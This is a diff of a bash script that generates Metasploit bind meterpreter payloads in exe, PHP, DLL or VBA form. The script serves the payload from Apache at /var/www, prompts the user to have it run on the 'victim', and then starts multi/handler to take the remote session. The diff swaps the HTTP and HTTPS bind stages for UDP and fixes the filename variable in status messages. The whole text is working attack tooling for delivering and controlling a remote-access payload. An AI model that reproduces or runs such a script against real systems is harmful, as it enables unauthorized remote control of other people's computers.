@@ -57,7 +57,7 @@ attacker=`ifconfig $1 | grep "inet " | cut -d: -f2 | cut -d" " -f1`
 
 if [ $# -ne 5 ]; then
 usage "Script to generate bind metasploit payloads and launch mulithandler."
-usage "$0 <port> <e(X)e|(P)hp|(D)ll|(V)BA > <filename> <victimip> <(H)ttp|Http(S)|(T)cp>"
+usage "$0 <port> <e(X)e|(P)hp|(D)ll|(V)BA > <filename> <victimip> <(T)cp | (U)dp>"
 exit
 fi
 
@@ -113,14 +113,9 @@ dir=`echo $PWD`
 
 case $stage in
  
- 'H')
- success "Bind HTTP Payload Selected"
- stage="bind_http"
- ;;
- 
- 'S')
- success "Bind HTTPS Payload Selected"
- stage="bind_https"
+ 'U')
+ success "Bind UDP Payload Selected"
+ stage="bind_udp"
  ;;
  
  'T')
@@ -135,12 +130,12 @@ esac
   #echo "$MSFPAY $type_payload/meterpreter/$stage LHOST=$attacker LPORT=$port $format > $dir/$filename.$extension"
   $MSFPAY $type_payload/meterpreter/$stage LPORT=$port $format > $dir/$filename.$extension
 
-  info "Transfer the [${BOLD}${YELLOW}filename.$extension${RESET}] to /var/www for delivery and starting webserver"
+  info "Transfer the [${BOLD}${YELLOW}$filename.$extension${RESET}] to /var/www for delivery and starting webserver"
   mv $filename.$extension /var/www
   /etc/init.d/apache2 start
   success "Apache server started"
-  info "Execute the [${BOLD}${YELLOW}filename.$extension${RESET}] to the $victim"
-  error "Have you executed [${BOLD}${YELLOW}filename.$extension${RESET}] to $victim?"
+  info "Execute the [${BOLD}${YELLOW}$filename.$extension${RESET}] to the $victim"
+  error "Have you executed [${BOLD}${YELLOW}$filename.$extension${RESET}] to $victim?"
   read answer
   info "Launching multihandler"
   $MSFCLI multi/handler PAYLOAD=$type_payload/meterpreter/$stage RHOST=$victim RPORT=$port E
